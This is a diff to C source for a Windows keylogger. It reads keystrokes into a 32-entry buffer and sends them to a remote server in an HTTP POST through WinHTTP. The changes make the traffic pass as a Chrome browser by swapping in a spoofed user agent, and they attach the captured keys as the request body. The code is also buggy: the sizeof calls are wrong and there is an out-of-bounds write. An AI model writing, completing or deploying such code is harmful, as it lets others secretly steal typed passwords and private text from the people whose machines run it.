@@ -5,13 +5,6 @@
 #pragma comment(lib, "winhttp.lib")
 #define N 32
 
-void printString(int capture[]) {
-	char string[N];
-	for (int i = 0; i < N - 1; i++) {
-		printf("%d ", capture[i]);
-	}
-}
-
 int sendCapture(int capture[]) {
 	DWORD dwSize = 0;
 	DWORD dwDownloaded = 0;
@@ -21,10 +14,10 @@ int sendCapture(int capture[]) {
 		hConnect = NULL,
 		hRequest = NULL;
 
-	char test = "a";
+	printf("%d", sizeof(capture));
 
     // Use WinHttpOpen to obtain a session handle.
-    hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
+    hSession = WinHttpOpen(L"Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 96.0.4664.45 Safari / 537.36",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
@@ -35,20 +28,28 @@ int sendCapture(int capture[]) {
             INTERNET_DEFAULT_HTTP_PORT, 0);
 
     // Create an HTTP Request handle.
-    if (hConnect)
-        hRequest = WinHttpOpenRequest(hConnect, L"POST",
-            capture,
-            NULL, WINHTTP_NO_REFERER,
-            WINHTTP_DEFAULT_ACCEPT_TYPES,
-            0);
+	if (hConnect)
+		hRequest = WinHttpOpenRequest(hConnect, L"POST",
+			L"/",
+			NULL, WINHTTP_NO_REFERER,
+			WINHTTP_DEFAULT_ACCEPT_TYPES,
+			0);
 
-    // Send a Request.
-    if (hRequest)
-        bResults = WinHttpSendRequest(hRequest,
-            WINHTTP_NO_ADDITIONAL_HEADERS,
-            0, sizeof(hRequest), 0,
-            0, 0);
+	LPCWSTR additionalHeaders = L"Content-Type: text/plain\r\n";
+	DWORD headersLength = -1;
 
+	// Send a Request.
+	if (hRequest)
+		bResults = WinHttpSendRequest(hRequest,
+			additionalHeaders,
+			headersLength, capture, N * sizeof(capture),
+			N * sizeof(capture), 0);
+
+	// Report any errors.
+	if (!bResults)
+		printf("Error %d has occurred.\n", GetLastError());
+
+	// Close any open handles.
 	if (hRequest) WinHttpCloseHandle(hRequest);
 	if (hConnect) WinHttpCloseHandle(hConnect);
 	if (hSession) WinHttpCloseHandle(hSession);
@@ -70,7 +71,7 @@ int main(void) {
 		if (kbhit()) {
 			key = getch();
 
-			if (l + 1 == N) {
+			if (l == N) {
 				capture[l + 1] = "\0";
 				sendCapture(capture);
 
